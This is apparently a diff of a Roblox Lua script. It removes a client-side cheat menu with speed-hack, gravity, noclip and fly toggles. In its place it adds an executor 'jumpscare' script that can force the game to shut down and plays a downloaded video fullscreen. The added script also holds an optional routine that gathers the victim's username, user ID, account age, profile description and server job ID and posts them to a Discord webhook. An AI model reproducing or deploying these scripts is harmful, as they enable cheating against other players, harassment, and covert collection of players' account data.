@@ -1,596 +1,131 @@
--- Enhanced Multi-Tab Cheat GUI
--- LocalScript: StarterPlayer > StarterPlayerScripts
-
-local SpeedHackKey = Enum.KeyCode.C
-
-local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
-local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-
--- ScreenGui
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "CheatGUI"
-screenGui.ResetOnSpawn = false
-screenGui.IgnoreGuiInset = true
-screenGui.Parent = playerGui
-
--- Main Frame
-local mainFrame = Instance.new("Frame")
-mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 350, 0, 320)
-mainFrame.Position = UDim2.new(0, 200, 0, 100)
-mainFrame.BackgroundColor3 = Color3.fromRGB(28,28,28)
-mainFrame.BorderSizePixel = 0
-mainFrame.Parent = screenGui
-
-local mainCorner = Instance.new("UICorner")
-mainCorner.CornerRadius = UDim.new(0, 12)
-mainCorner.Parent = mainFrame
-
--- TitleBar
-local titleBar = Instance.new("Frame")
-titleBar.Name = "TitleBar"
-titleBar.Size = UDim2.new(1, 0, 0, 36)
-titleBar.Position = UDim2.new(0, 0, 0, 0)
-titleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-titleBar.BorderSizePixel = 0
-titleBar.Parent = mainFrame
-
-local titleCorner = Instance.new("UICorner")
-titleCorner.CornerRadius = UDim.new(0, 12)
-titleCorner.Parent = titleBar
-
--- Title Text
-local titleLabel = Instance.new("TextLabel")
-titleLabel.Size = UDim2.new(1, -40, 1, 0)
-titleLabel.Position = UDim2.new(0, 12, 0, 0)
-titleLabel.BackgroundTransparency = 1
-titleLabel.Text = "Enhanced Cheat GUI"
-titleLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
-titleLabel.TextSize = 18
-titleLabel.Font = Enum.Font.GothamBold
-titleLabel.TextXAlignment = Enum.TextXAlignment.Left
-titleLabel.Parent = titleBar
-
--- Close Button
-local closeButton = Instance.new("TextButton")
-closeButton.Size = UDim2.new(0, 28, 0, 28)
-closeButton.Position = UDim2.new(1, -36, 0, 4)
-closeButton.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
-closeButton.BorderSizePixel = 0
-closeButton.Text = "×"
-closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-closeButton.TextSize = 20
-closeButton.Font = Enum.Font.GothamBold
-closeButton.Parent = titleBar
-
-local closeCorner = Instance.new("UICorner")
-closeCorner.CornerRadius = UDim.new(0, 8)
-closeCorner.Parent = closeButton
-
--- Tab Buttons Frame
-local tabFrame = Instance.new("Frame")
-tabFrame.Size = UDim2.new(1, -16, 0, 36)
-tabFrame.Position = UDim2.new(0, 8, 0, 46)
-tabFrame.BackgroundTransparency = 1
-tabFrame.Parent = mainFrame
-
-local function createTabButton(name, posScale, tabCount)
-	local btn = Instance.new("TextButton")
-	btn.Size = UDim2.new(1/tabCount, -6, 1, 0)
-	btn.Position = UDim2.new(posScale, 6*(posScale>0 and 1 or 0), 0, 0)
-	btn.BackgroundColor3 = Color3.fromRGB(55,55,55)
-	btn.Text = name
-	btn.TextColor3 = Color3.fromRGB(220,220,220)
-	btn.Font = Enum.Font.Gotham
-	btn.TextSize = 14
-	btn.Parent = tabFrame
-	local corner = Instance.new("UICorner")
-	corner.CornerRadius = UDim.new(0,8)
-	corner.Parent = btn
-	return btn
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+if jumpscare_jeffwuz_loaded and not _G.jumpscarefucking123 == true then
+	warn("Already Loading")
+    return
 end
 
-local tabSpeedButton = createTabButton("SpeedHack", 0, 3)
-local tabGravityButton = createTabButton("Gravity", 1/3, 3)
-local tabMovementButton = createTabButton("Movement", 2/3, 3)
+pcall(function() getgenv().jumpscare_jeffwuz_loaded = true end)
 
--- Content Frame
-local tabContent = Instance.new("Frame")
-tabContent.Size = UDim2.new(1, -16, 1, -92)
-tabContent.Position = UDim2.new(0,8,0,88)
-tabContent.BackgroundTransparency = 1
-tabContent.Parent = mainFrame
+getgenv().Notify = false
+local Notify_Webhook = "Your Discord Webhook"
 
--- ===== SpeedHack Content =====
-local speedFrame = Instance.new("Frame")
-speedFrame.Size = UDim2.new(1,0,1,0)
-speedFrame.BackgroundTransparency = 1
-speedFrame.Parent = tabContent
-
-local toggleButton = Instance.new("TextButton")
-toggleButton.Size = UDim2.new(0,200,0,28)
-toggleButton.Position = UDim2.new(0,0,0,0)
-toggleButton.BackgroundColor3 = Color3.fromRGB(70,70,70)
-toggleButton.Text = "OFF"
-toggleButton.TextColor3 = Color3.fromRGB(220,220,220)
-toggleButton.Font = Enum.Font.GothamBold
-toggleButton.TextSize = 16
-toggleButton.Parent = speedFrame
-local toggleCorner = Instance.new("UICorner")
-toggleCorner.CornerRadius = UDim.new(0,8)
-toggleCorner.Parent = toggleButton
-
-local speedLabel = Instance.new("TextLabel")
-speedLabel.Size = UDim2.new(0,120,0,28)
-speedLabel.Position = UDim2.new(0,0,0,36)
-speedLabel.BackgroundTransparency = 1
-speedLabel.Text = "Player Speed:"
-speedLabel.TextColor3 = Color3.fromRGB(220,220,220)
-speedLabel.Font = Enum.Font.Gotham
-speedLabel.TextSize = 15
-speedLabel.TextXAlignment = Enum.TextXAlignment.Left
-speedLabel.Parent = speedFrame
-
-local speedTextBox = Instance.new("TextBox")
-speedTextBox.Size = UDim2.new(0,100,0,28)
-speedTextBox.Position = UDim2.new(0,130,0,36)
-speedTextBox.BackgroundColor3 = Color3.fromRGB(70,70,70)
-speedTextBox.Text = "16"
-speedTextBox.TextColor3 = Color3.fromRGB(220,220,220)
-speedTextBox.Font = Enum.Font.Gotham
-speedTextBox.TextSize = 15
-speedTextBox.TextXAlignment = Enum.TextXAlignment.Center
-speedTextBox.ClearTextOnFocus = false
-speedTextBox.Parent = speedFrame
-local speedCorner = Instance.new("UICorner")
-speedCorner.CornerRadius = UDim.new(0,8)
-speedCorner.Parent = speedTextBox
-
--- ===== Gravity Content =====
-local gravityFrame = Instance.new("Frame")
-gravityFrame.Size = UDim2.new(1,0,1,0)
-gravityFrame.BackgroundTransparency = 1
-gravityFrame.Visible = false
-gravityFrame.Parent = tabContent
-
-local gravityLabel = Instance.new("TextLabel")
-gravityLabel.Size = UDim2.new(0,130,0,28)
-gravityLabel.Position = UDim2.new(0,0,0,0)
-gravityLabel.BackgroundTransparency = 1
-gravityLabel.Text = "Gravity Value:"
-gravityLabel.TextColor3 = Color3.fromRGB(220,220,220)
-gravityLabel.Font = Enum.Font.Gotham
-gravityLabel.TextSize = 15
-gravityLabel.TextXAlignment = Enum.TextXAlignment.Left
-gravityLabel.Parent = gravityFrame
-
-local gravityTextBox = Instance.new("TextBox")
-gravityTextBox.Size = UDim2.new(0,100,0,28)
-gravityTextBox.Position = UDim2.new(0,140,0,0)
-gravityTextBox.BackgroundColor3 = Color3.fromRGB(70,70,70)
-gravityTextBox.Text = tostring(workspace.Gravity)
-gravityTextBox.TextColor3 = Color3.fromRGB(220,220,220)
-gravityTextBox.Font = Enum.Font.Gotham
-gravityTextBox.TextSize = 15
-gravityTextBox.TextXAlignment = Enum.TextXAlignment.Center
-gravityTextBox.ClearTextOnFocus = false
-gravityTextBox.Parent = gravityFrame
-local gravityCorner = Instance.new("UICorner")
-gravityCorner.CornerRadius = UDim.new(0,8)
-gravityCorner.Parent = gravityTextBox
-
-local gravityButton = Instance.new("TextButton")
-gravityButton.Size = UDim2.new(0,80,0,28)
-gravityButton.Position = UDim2.new(0,250,0,0)
-gravityButton.BackgroundColor3 = Color3.fromRGB(70,70,70)
-gravityButton.Text = "Apply"
-gravityButton.TextColor3 = Color3.fromRGB(220,220,220)
-gravityButton.Font = Enum.Font.GothamBold
-gravityButton.TextSize = 14
-gravityButton.Parent = gravityFrame
-local gravityBtnCorner = Instance.new("UICorner")
-gravityBtnCorner.CornerRadius = UDim.new(0,8)
-gravityBtnCorner.Parent = gravityButton
-
--- Toggle Zero-G mode
-local zeroGButton = Instance.new("TextButton")
-zeroGButton.Size = UDim2.new(0,120,0,28)
-zeroGButton.Position = UDim2.new(0,0,0,40)
-zeroGButton.BackgroundColor3 = Color3.fromRGB(70,70,70)
-zeroGButton.Text = "Zero-G OFF"
-zeroGButton.TextColor3 = Color3.fromRGB(220,220,220)
-zeroGButton.Font = Enum.Font.GothamBold
-zeroGButton.TextSize = 15
-zeroGButton.Parent = gravityFrame
-local zeroGCorner = Instance.new("UICorner")
-zeroGCorner.CornerRadius = UDim.new(0,8)
-zeroGCorner.Parent = zeroGButton
-
--- ===== Movement Content =====
-local movementFrame = Instance.new("Frame")
-movementFrame.Size = UDim2.new(1,0,1,0)
-movementFrame.BackgroundTransparency = 1
-movementFrame.Visible = false
-movementFrame.Parent = tabContent
-
--- Noclip Toggle
-local noclipButton = Instance.new("TextButton")
-noclipButton.Size = UDim2.new(0,120,0,28)
-noclipButton.Position = UDim2.new(0,0,0,0)
-noclipButton.BackgroundColor3 = Color3.fromRGB(70,70,70)
-noclipButton.Text = "Noclip OFF"
-noclipButton.TextColor3 = Color3.fromRGB(220,220,220)
-noclipButton.Font = Enum.Font.GothamBold
-noclipButton.TextSize = 15
-noclipButton.Parent = movementFrame
-local noclipCorner = Instance.new("UICorner")
-noclipCorner.CornerRadius = UDim.new(0,8)
-noclipCorner.Parent = noclipButton
-
--- Fly Toggle
-local flyButton = Instance.new("TextButton")
-flyButton.Size = UDim2.new(0,120,0,28)
-flyButton.Position = UDim2.new(0,130,0,0)
-flyButton.BackgroundColor3 = Color3.fromRGB(70,70,70)
-flyButton.Text = "Fly OFF"
-flyButton.TextColor3 = Color3.fromRGB(220,220,220)
-flyButton.Font = Enum.Font.GothamBold
-flyButton.TextSize = 15
-flyButton.Parent = movementFrame
-local flyCorner = Instance.new("UICorner")
-flyCorner.CornerRadius = UDim.new(0,8)
-flyCorner.Parent = flyButton
-
--- Fly Speed Control
-local flySpeedLabel = Instance.new("TextLabel")
-flySpeedLabel.Size = UDim2.new(0,100,0,28)
-flySpeedLabel.Position = UDim2.new(0,0,0,36)
-flySpeedLabel.BackgroundTransparency = 1
-flySpeedLabel.Text = "Fly Speed:"
-flySpeedLabel.TextColor3 = Color3.fromRGB(220,220,220)
-flySpeedLabel.Font = Enum.Font.Gotham
-flySpeedLabel.TextSize = 15
-flySpeedLabel.TextXAlignment = Enum.TextXAlignment.Left
-flySpeedLabel.Parent = movementFrame
-
-local flySpeedTextBox = Instance.new("TextBox")
-flySpeedTextBox.Size = UDim2.new(0,80,0,28)
-flySpeedTextBox.Position = UDim2.new(0,110,0,36)
-flySpeedTextBox.BackgroundColor3 = Color3.fromRGB(70,70,70)
-flySpeedTextBox.Text = "50"
-flySpeedTextBox.TextColor3 = Color3.fromRGB(220,220,220)
-flySpeedTextBox.Font = Enum.Font.Gotham
-flySpeedTextBox.TextSize = 15
-flySpeedTextBox.TextXAlignment = Enum.TextXAlignment.Center
-flySpeedTextBox.ClearTextOnFocus = false
-flySpeedTextBox.Parent = movementFrame
-local flySpeedCorner = Instance.new("UICorner")
-flySpeedCorner.CornerRadius = UDim.new(0,8)
-flySpeedCorner.Parent = flySpeedTextBox
-
--- Fly Controls Info
-local flyInfoLabel = Instance.new("TextLabel")
-flyInfoLabel.Size = UDim2.new(1,0,0,60)
-flyInfoLabel.Position = UDim2.new(0,0,0,72)
-flyInfoLabel.BackgroundTransparency = 1
-flyInfoLabel.Text = "Fly Controls:\nW/A/S/D - Move\nSpace/Shift - Up/Down\nQ/E - Toggle Speed"
-flyInfoLabel.TextColor3 = Color3.fromRGB(180,180,180)
-flyInfoLabel.Font = Enum.Font.Gotham
-flyInfoLabel.TextSize = 12
-flyInfoLabel.TextXAlignment = Enum.TextXAlignment.Left
-flyInfoLabel.TextYAlignment = Enum.TextYAlignment.Top
-flyInfoLabel.Parent = movementFrame
-
--- ===== Variables =====
-local isToggleOn = false
-local isLeftShiftPressed = false
-local zeroGActive = false
-local originalSpeed = 16
-local speedConnection
-
--- Movement Variables
-local noclipActive = false
-local flyActive = false
-local noclipConnection
-local flyConnection
-local flySpeed = 50
-local flyVelocity = Vector3.new(0,0,0)
-local bodyVelocity
-local bodyGyro
-
--- ===== Functions =====
-local function updateSpeedStatus()
-	toggleButton.Text = isToggleOn and "ON" or "OFF"
+if not getcustomasset then
+	game:Shutdown() -- Fucked out
 end
 
-local function applySpeed()
-	local char = player.Character
-	if char and char:FindFirstChild("Humanoid") then
-		local humanoid = char.Humanoid
-		local speed = tonumber(speedTextBox.Text) or 16
-		if isToggleOn and isLeftShiftPressed then
-			humanoid.WalkSpeed = speed
-		else
-			humanoid.WalkSpeed = originalSpeed
-		end
-	end
+local player = game:GetService("Players").LocalPlayer
+local HttpService = game:GetService('HttpService')
+
+local ScreenGui = Instance.new("ScreenGui")
+local VideoScreen = Instance.new("VideoFrame")
+ScreenGui.Parent = game:GetService("CoreGui")
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.Name = "JeffTheKillerWuzHere"
+
+VideoScreen.Parent = ScreenGui
+VideoScreen.Size = UDim2.new(1,0,1,0)
+
+writefile("yes.mp4", game:HttpGet("https://github.com/HappyCow91/RobloxScripts/blob/main/Videos/videoplayback.mp4?raw=true"))
+
+VideoScreen.Video = getcustomasset("yes.mp4")
+
+VideoScreen.Looped = true
+VideoScreen.Playing = true
+VideoScreen.Volume = 10
+
+function notify_hook()
+	-- Thumb API
+	local ThumbnailAPI = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..player.UserId.."&size=420x420&format=Png&isCircular=true")
+	local json = HttpService:JSONDecode(ThumbnailAPI)
+	local avatardata = json.data[1].imageUrl
+
+	-------- User API Script
+	local UserAPI = game:HttpGet("https://users.roproxy.com/v1/users/"..player.UserId)
+	local json = HttpService:JSONDecode(UserAPI)
+	-------- Description Data
+	local DescriptionData = json.description
+	-------- Created Data
+	local CreatedData = json.created
+
+	local send_data = {
+		["username"] = "Jumpscare Notify",
+		["avatar_url"] = "https://static.wikia.nocookie.net/19dbe80e-0ae6-48c7-98c7-3c32a39b2d7c/scale-to-width/370",
+		["content"] = "Jeff Wuz Here !",
+		["embeds"] = {
+			{
+				["title"] = "Jeff's Log",
+				["description"] = "**Game : https://www.roblox.com/games/"..game.PlaceId.."**\n\n**Profile : https://www.roblox.com/users/"..player.UserId.."/profile**\n\n**Job ID : "..game.JobId.."**",
+				["color"] = 4915083,
+				["fields"] = {
+					{
+						["name"] = "Username",
+						["value"] = player.Name,
+						["inline"] = true
+					},
+					{
+						["name"] = "Display Name",
+						["value"] = player.DisplayName,
+						["inline"] = true
+					},
+					{
+						["name"] = "User ID",
+						["value"] = player.UserId,
+						["inline"] = true
+					},
+					{
+						["name"] = "Account Age",
+						["value"] = player.AccountAge.." Day",
+						["inline"] = true
+					},
+					{
+						["name"] = "Membership",
+						["value"] = player.MembershipType.Name,
+						["inline"] = true
+					},
+					{
+						["name"] = "Account Created Day",
+						["value"] = string.match(CreatedData, "^([%d-]+)"),
+						["inline"] = true
+					},
+					{
+						["name"] = "Profile Description",
+						["value"] = "```\n"..DescriptionData.."\n```",
+						["inline"] = true
+					}
+				},
+				["footer"] = {
+					["text"] = "JTK Log",
+					["icon_url"] = "https://miro.medium.com/v2/resize:fit:1280/0*c6-eGC3Dd_3HoF-B"
+				},
+				["thumbnail"] = {
+					["url"] = avatardata
+				}
+			}
+		},
+	}
+
+	local headers = {
+		["Content-Type"] = "application/json"
+	}
+
+	request({
+		Url = Notify_Webhook,
+		Method = "POST",
+		Headers = headers,
+		Body = game:GetService("HttpService"):JSONEncode(send_data)
+	})
 end
 
--- Noclip Functions
-local function noclip()
-	if noclipActive and player.Character then
-		for _, part in pairs(player.Character:GetDescendants()) do
-			if part:IsA("BasePart") then
-				part.CanCollide = false
-			end
-		end
-	end
-end
-
-local function toggleNoclip()
-	noclipActive = not noclipActive
-	noclipButton.Text = noclipActive and "Noclip ON" or "Noclip OFF"
-
-	if noclipActive then
-		if noclipConnection then noclipConnection:Disconnect() end
-		noclipConnection = RunService.Stepped:Connect(noclip)
+if getgenv().Notify == true then
+	if Notify_Webhook == '' then
+		return;
 	else
-		if noclipConnection then
-			noclipConnection:Disconnect()
-			noclipConnection = nil
-		end
-		-- Restore collision when noclip is off
-		if player.Character then
-			for _, part in pairs(player.Character:GetDescendants()) do
-				if part:IsA("BasePart") then
-					part.CanCollide = true
-				end
-			end
-		end
+		notify_hook()
 	end
+elseif getgenv().Notify == false then
+	return;
+else
+	warn("True or False")
 end
-
--- Fly Functions
-local function startFly()
-	if not player.Character then return end
-
-	local character = player.Character
-	local humanoid = character:FindFirstChild("Humanoid")
-	local rootPart = character:FindFirstChild("HumanoidRootPart")
-
-	if not humanoid or not rootPart then return end
-
-	-- Create fly controls
-	bodyVelocity = Instance.new("BodyVelocity")
-	bodyVelocity.Velocity = Vector3.new(0,0,0)
-	bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
-	bodyVelocity.Parent = rootPart
-
-	bodyGyro = Instance.new("BodyGyro")
-	bodyGyro.MaxTorque = Vector3.new(4000, 4000, 4000)
-	bodyGyro.P = 1000
-	bodyGyro.D = 50
-	bodyGyro.Parent = rootPart
-
-	humanoid.PlatformStand = true
-
-	flyConnection = RunService.Heartbeat:Connect(function()
-		if not flyActive or not character or not rootPart then
-			if flyConnection then flyConnection:Disconnect() end
-			return
-		end
-
-		bodyGyro.CFrame = workspace.CurrentCamera.CFrame
-
-		local direction = Vector3.new(0,0,0)
-
-		if UserInputService:IsKeyDown(Enum.KeyCode.W) then
-			direction = direction + (workspace.CurrentCamera.CFrame.LookVector * flySpeed)
-		end
-		if UserInputService:IsKeyDown(Enum.KeyCode.S) then
-			direction = direction - (workspace.CurrentCamera.CFrame.LookVector * flySpeed)
-		end
-		if UserInputService:IsKeyDown(Enum.KeyCode.D) then
-			direction = direction + (workspace.CurrentCamera.CFrame.RightVector * flySpeed)
-		end
-		if UserInputService:IsKeyDown(Enum.KeyCode.A) then
-			direction = direction - (workspace.CurrentCamera.CFrame.RightVector * flySpeed)
-		end
-		if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
-			direction = direction + (Vector3.new(0,1,0) * flySpeed)
-		end
-		if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
-			direction = direction + (Vector3.new(0,-1,0) * flySpeed)
-		end
-
-		bodyVelocity.Velocity = direction
-	end)
-end
-
-local function stopFly()
-	if flyConnection then
-		flyConnection:Disconnect()
-		flyConnection = nil
-	end
-
-	if bodyVelocity then
-		bodyVelocity:Destroy()
-		bodyVelocity = nil
-	end
-
-	if bodyGyro then
-		bodyGyro:Destroy()
-		bodyGyro = nil
-	end
-
-	if player.Character and player.Character:FindFirstChild("Humanoid") then
-		player.Character.Humanoid.PlatformStand = false
-	end
-end
-
-local function toggleFly()
-	flyActive = not flyActive
-	flyButton.Text = flyActive and "Fly ON" or "Fly OFF"
-
-	if flyActive then
-		startFly()
-	else
-		stopFly()
-	end
-end
-
--- Tab Switching
-tabSpeedButton.MouseButton1Click:Connect(function()
-	speedFrame.Visible = true
-	gravityFrame.Visible = false
-	movementFrame.Visible = false
-end)
-
-tabGravityButton.MouseButton1Click:Connect(function()
-	speedFrame.Visible = false
-	gravityFrame.Visible = true
-	movementFrame.Visible = false
-end)
-
-tabMovementButton.MouseButton1Click:Connect(function()
-	speedFrame.Visible = false
-	gravityFrame.Visible = false
-	movementFrame.Visible = true
-end)
-
--- Toggle Speed
-toggleButton.MouseButton1Click:Connect(function()
-	isToggleOn = not isToggleOn
-	updateSpeedStatus()
-	applySpeed()
-end)
-
--- Apply Gravity
-gravityButton.MouseButton1Click:Connect(function()
-	local val = tonumber(gravityTextBox.Text)
-	if val then
-		workspace.Gravity = val
-	end
-end)
-
--- Zero-G Toggle
-zeroGButton.MouseButton1Click:Connect(function()
-	zeroGActive = not zeroGActive
-	local char = player.Character
-	if not char or not char:FindFirstChild("HumanoidRootPart") or not char:FindFirstChild("Humanoid") then return end
-	local humanoid = char.Humanoid
-	local root = char.HumanoidRootPart
-
-	if zeroGActive then
-		zeroGButton.Text = "Zero-G ON"
-		humanoid.PlatformStand = true
-		workspace.Gravity = 0
-	else
-		zeroGButton.Text = "Zero-G OFF"
-		humanoid.PlatformStand = false
-		local grav = tonumber(gravityTextBox.Text) or 196.2
-		workspace.Gravity = grav
-	end
-end)
-
--- Noclip Toggle
-noclipButton.MouseButton1Click:Connect(toggleNoclip)
-
--- Fly Toggle
-flyButton.MouseButton1Click:Connect(toggleFly)
-
--- Fly Speed Control
-flySpeedTextBox:GetPropertyChangedSignal("Text"):Connect(function()
-	local t = flySpeedTextBox.Text
-	flySpeedTextBox.Text = string.gsub(t,"[^%d]","")
-	flySpeed = tonumber(flySpeedTextBox.Text) or 50
-end)
-
--- Validate TextBoxes
-speedTextBox:GetPropertyChangedSignal("Text"):Connect(function()
-	local t = speedTextBox.Text
-	speedTextBox.Text = string.gsub(t,"[^%d]","")
-	applySpeed()
-end)
-
-gravityTextBox:GetPropertyChangedSignal("Text"):Connect(function()
-	local t = gravityTextBox.Text
-	gravityTextBox.Text = string.gsub(t,"[^%d%-]","")
-end)
-
--- LeftShift for Speed
-UserInputService.InputBegan:Connect(function(input, processed)
-	if not processed and input.KeyCode == SpeedHackKey then
-		isLeftShiftPressed = true
-		applySpeed()
-	end
-end)
-
-UserInputService.InputEnded:Connect(function(input, processed)
-	if not processed and input.KeyCode == SpeedHackKey then
-		isLeftShiftPressed = false
-		applySpeed()
-	end
-end)
-
--- Character spawn
-player.CharacterAdded:Connect(function(char)
-	local humanoid = char:WaitForChild("Humanoid")
-	originalSpeed = humanoid.WalkSpeed
-	if speedConnection then speedConnection:Disconnect() end
-	speedConnection = RunService.Heartbeat:Connect(applySpeed)
-
-	-- Reset movement cheats on respawn
-	if noclipActive then
-		toggleNoclip()
-	end
-	if flyActive then
-		toggleFly()
-	end
-end)
-
--- Initialize
-if player.Character and player.Character:FindFirstChild("Humanoid") then
-	originalSpeed = player.Character.Humanoid.WalkSpeed
-	speedConnection = RunService.Heartbeat:Connect(applySpeed)
-end
-
--- Drag
-local isDragging = false
-local dragStart
-local startPos
-titleBar.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1 then
-		isDragging = true
-		dragStart = input.Position
-		startPos = mainFrame.Position
-	end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-	if isDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-		local delta = input.Position - dragStart
-		mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-	end
-end)
-
-UserInputService.InputEnded:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1 then
-		isDragging = false
-	end
-end)
-
--- Close GUI
-closeButton.MouseButton1Click:Connect(function()
-	if speedConnection then speedConnection:Disconnect() end
-	if noclipConnection then noclipConnection:Disconnect() end
-	if flyConnection then flyConnection:Disconnect() end
-	stopFly()
-	screenGui:Destroy()
-end)
-
-print("Enhanced Cheat GUI Loaded!")
